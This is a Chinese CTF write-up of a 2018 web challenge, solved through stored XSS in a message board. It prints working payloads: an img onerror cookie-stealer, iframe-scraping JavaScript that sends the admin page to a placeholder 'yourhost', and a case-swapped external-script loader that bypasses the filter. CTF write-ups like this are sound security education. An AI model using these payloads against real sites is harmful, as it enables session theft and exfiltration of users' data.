---
title: 2018安恒杯二月赛-web-应该不是 XSS
comments: true
date: 2018-02-25 17:38:58
tags:
	- writeup
	- xss
categories:
	- 信息安全
	- writeup
keywords: 
	- writeup
	- xss
---
## 0x01 初步分析阶段

首先拿到题目，看到留言板，第一反应就是XSS。

但是看过题目提示后，有些不确定。

所以开始分析整道题目。

<!-- more -->

首先，观察network页面，查看主页面的响应。

发现是通过js进行子页面的渲染。类似于iframe。

一共有四个js文件，前两个明显是jQuery的库文件，不用管它，开始分析[main.js](https://img.5am3.com/main.js)与[app.js](https://img.5am3.com/app.js)

![mark](https://img.5am3.com/img/180225/jA3j6K7Lm3.png)


[main.js](https://img.5am3.com/main.js)很明显是渲染页面代码。

![mark](https://img.5am3.com/img/180225/lDLL3d8HJd.png)


通过代码可以发现，当我们构造`http://192.168.5.28/#login`

即可访问其他页面。大家常见的应该是通过php后端渲染这些，通过include去实现在当前模板下渲染页面。此时是通过前端渲染的。

在第七行可以看到一共有4个页面，即有以下页面

```
http://192.168.5.28/#login
http://192.168.5.28/#feedback
http://192.168.5.28/#main
http://192.168.5.28/#chgpass
```

然后再进行[app.js](https://img.5am3.com/app.js)的分析

可以明显看出是一个功能的控制，可以分析出有以下功能

```
登录：'./api.php?action=login&' + Math.random()
发送留言： './api.php?action=savepost&' + Math.random()
修改密码：'./api.php?action=chgpass&' + Math.random()
获取所有留言：'./api.php?action=getpost&' + Math.random()
```

## 0x02 进一步分析（XSS)

首先，依次访问以上页面，发现chgpass和main是需要登陆后才能访问。

而且main页面下有flag{}字样。

所以判断出，**题目要求你以管理员身份登录后，获取到main页面下的flag。**

![mark](https://img.5am3.com/img/180225/E4kAAdfkcD.png)

在登录页面尝试弱口令登录后，无果。于是又把思路转向了xss。

想着可不可以拿到管理员cookie。经过尝试后，发现他做了一些xss的防范

> 1.将script标签中间强行加入空格
>
> 2.在<与s之间强行加入空格
>
> 3.标题处有转义，无法xss
>
> 4.限制字符长度300

于是构造payload如下

`<img src='1' onerror="window.location.href='http://youhost/?'+document.cookie";>`

本地测试成功，然后发送，发现获取cookie为空，即服务器端可能做了[HttpOnly](https://www.cnblogs.com/zlhff/p/5477943.html)的限制。

所以此方法失败！！

然后尝试其他思路，想到了国赛的一道题目guestbook，已经xman排位赛的xss2。

通过构造js，来让管理员直接访问main页面，然后将其源码拖下来。

**首先通过js引入一个iframe，来访问main页面，然后通过js拿到iframe的源码，发送回来。**

此时遇到了一个问题，即iframe加载不完全，所以自己又添加了一个定时器。

最终代码如下

```
var iframe = document.createElement("iframe");
 iframe.src = "./#main";
 document.body.appendChild(iframe);
 iframe.onload = setInterval(function (){ 
 	var c = encodeURI(document.getElementsByTagName("iframe")[0].contentWindow.document.getElementsByTagName("body")[0].innerHTML);
  	var n0t = document.createElement("link");
 	n0t.setAttribute("rel", "prefetch");
 	n0t.setAttribute("href", "//yourhost/?a=" + c);
 	document.head.appendChild(n0t);
 },1000)

```

由于代码超过了可以发送文本的长度，所以想办法采用其他方式，如外部引入js。

引入这里，自己采用的是在xss平台上面学到的一句话

`<img src=x onerror="s=createElement('script');body.appendChild(s);s.src='你的js地址';">`

此时由于存在script，所以得绕过一下，自己采用的是大小写绕过。将其改为下面代码即可。

`<img src=x onerror="s=createElement('Script');body.appendChild(s);s.src='你的js地址';">`

然后进行多次提交。即可收到打回来的代码。

![mark](https://img.5am3.com/img/180225/2031km43gh.png)

最后进行url解码后即可拿到flag

## 0x03 总结

题目还是蛮有意思的，主办方给的hint是csrf。

自己想了想，完全可以打源码，拿到管理员token后，然后通过构造csrf去修改管理员密码，然后登陆。

貌似自己的是非预期解法，毕竟登陆页面和修改密码页面都没有用到，而且自己这个也不算csrf。

成功的用xss再次解出一道题。

## 参考资料

- [HttpOnly](https://www.cnblogs.com/zlhff/p/5477943.html)
- [XMAN排位赛xss题解](https://www.xctf.org.cn/library/details/eea49ee57a63f91de4ae9fa58b45f4aec9858dd5/)
- [国赛writeup链接](https://bbs.ichunqiu.com/thread-25351-1-1.html)-guestbook
- [app.js](https://img.5am3.com/app.js)
- [main.js](https://img.5am3.com/main.js)
- [XSS平台](http://webxss.top)